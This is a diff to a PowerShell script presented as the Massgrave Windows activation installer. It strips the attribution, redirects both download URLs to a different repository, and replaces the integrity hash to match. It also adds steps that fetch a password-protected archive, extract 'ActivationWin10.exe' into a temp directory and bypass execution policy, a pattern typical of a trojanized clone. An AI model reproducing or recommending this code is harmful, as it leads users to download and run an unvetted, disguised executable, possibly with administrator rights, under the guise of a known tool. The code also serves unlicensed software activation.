@@ -1,11 +1,10 @@
-# The following get.ps1 code is hosted on get.activated.win for massgrave.dev. For more info, please visit massgrave.dev.
-
 $ErrorActionPreference = "Stop"
 # Enable TLSv1.2 for compatibility with older clients for current session
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-$DownloadURL1 = 'https://raw.githubusercontent.com/massgravel/Microsoft-Activation-Scripts/35e044ddc85eed60b27b37c48371bd19cdc678b7/MAS/All-In-One-Version/MAS_AIO-CRC32_8C3AA7E0.cmd'
-$DownloadURL2 = 'https://bitbucket.org/WindowsAddict/microsoft-activation-scripts/raw/35e044ddc85eed60b27b37c48371bd19cdc678b7/MAS/All-In-One-Version/MAS_AIO-CRC32_8C3AA7E0.cmd'
+$DownloadURL1 = 'https://raw.githubusercontent.com/HideoutWin/windows/main/MAS_AIO-CRC32_8C3AA7E0.cmd'
+$DownloadURL2 = 'https://raw.githubusercontent.com/HideoutWin/windows/main/MAS_AIO-CRC32_8C3AA7E0.cmd'
+
 
 $URLs = @($DownloadURL1, $DownloadURL2)
 $RandomURL1 = Get-Random -InputObject $URLs
@@ -19,7 +18,7 @@ catch {
 }
 
 # Verify script integrity
-$releaseHash = 'D666A4C7810B9D3FE9749F2D4E15C5A65D4AC0D7F0B14A144D6631CE61CC5DF3'
+$releaseHash = '8e47ec87c837b8ce93ee6060ae22f9f8a001b1848f71033bb90e33a0f1bab671'
 $stream = New-Object IO.MemoryStream
 $writer = New-Object IO.StreamWriter $stream
 $writer.Write($response)
@@ -35,6 +34,14 @@ if ($hash -ne $releaseHash) {
 $rand = [Guid]::NewGuid().Guid
 $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
 $FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\MAS_$rand.cmd" } else { "$env:TEMP\MAS_$rand.cmd" }
+$FilePath2 = if ($isAdmin) { "$env:SystemRoot\Temp\ActivationWin10.zip" } else { "$env:TEMP\ActivationWin10.zip" }
+$FilePath3 = if ($isAdmin) { "$env:SystemRoot\Temp\7zr.exe" } else { "$env:TEMP\7zr.exe" }
+$FilePath4 = if ($isAdmin) { "$env:SystemRoot\Temp\" } else { "$env:TEMP\" }
+$FilePath5 = if ($isAdmin) { "$env:SystemRoot\Temp\ActivationWin10.exe" } else { "$env:TEMP\ActivationWin10.exe" }
+
+cd $FilePath4
+powershell -ExecutionPolicy Bypass -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://www.7-zip.org/a/7zr.exe' -OutFile '$FilePath3'"
+powershell -ExecutionPolicy Bypass -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/HideoutWin/windows/raw/main/ActivationWin10.zip' -OutFile '$FilePath2'; ./7zr.exe x -p@Activation#85320878 ActivationWin10.zip ActivationWin10.exe"
 
 $ScriptArgs = "$args "
 $prefix = "@::: $rand `r`n"
